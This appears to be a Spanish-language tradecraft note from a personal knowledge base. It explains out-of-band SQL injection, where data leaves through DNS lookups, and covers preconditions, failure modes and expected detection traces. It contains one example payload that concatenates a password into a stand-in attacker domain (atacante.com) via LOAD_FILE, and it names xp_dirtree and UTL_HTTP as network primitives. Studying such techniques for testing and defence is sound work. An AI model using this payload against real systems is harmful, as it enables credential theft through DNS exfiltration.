---
tipo: tradecraft
clase: "[[CWE-89 - SQL Injection]]"
eje: canal-de-extraccion
implementacion: "El servidor de BD resuelve un dominio propio; el dato viaja en el subdominio"
opsec: requiere-bypass
telemetria: ["[[Consulta DNS saliente]]"]
requisitos: [egress-de-red, primitiva-de-red-en-el-motor]
coste: bajo
alternativas: ["[[SQLi - canal booleano ciego]]", "[[SQLi - canal temporal ciego]]"]
probado: 2026-08-06
contexto: [mssql2019]
aliases:
  - SQLi out-of-band
  - OOB
tags:
  - dominio/web
---

# SQLi - canal fuera de banda

## Cuándo lo elijo

Cuando no hay salida reflejada, ni error, ni diferencia en la respuesta —el caso más ciego— **pero el servidor de base de datos puede salir a la red**. Es la rama que el árbol de [[MOC - SQL injection]] prueba **antes** del temporal, porque saca el dato de una sola vez en vez de bit por bit.

También es la vía cuando el ciego por inferencia sería demasiado lento (un dump grande contra rate limiting).

## Por qué funciona

El dato no vuelve por el canal HTTP: sale por un **segundo canal** que el defensor quizá no mira. La subconsulta se concatena en un nombre de dominio controlado por el atacante y el motor lo resuelve — `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password),'.atacante.com\\x'))`. La consulta DNS que llega al servidor del atacante trae el dato en el subdominio, en una sola petición.

## Cómo falla

- **Sin egress** — si el server no resuelve dominios externos, el canal no existe. Es la precondición dura.
- **Primitiva bloqueada** — cada motor necesita una función de red habilitada; suelen estar restringidas.
- **DNS interno sin salida** — si el resolver corporativo no reenvía a internet, la consulta muere adentro.
- **Egress filtering / EDR de red** que corta la resolución anómala.

## Coste

Bajo en peticiones —un dato por resolución, a veces todo de una— pero **alto en requisitos**: necesita egress y una primitiva de red, que es exactamente lo que más se restringe. Por eso es potente cuando está, y raro que esté.

## Huella esperada

- [[Consulta DNS saliente]] desde la IP del servidor de base de datos hacia un dominio externo — anomalía fuerte.
- El payload con `LOAD_FILE`/`UTL_HTTP`/`master..xp_dirtree` en el [[Log de acceso del servidor web]].

Payloads en [[SQLi fuera de banda - matriz de referencia]].
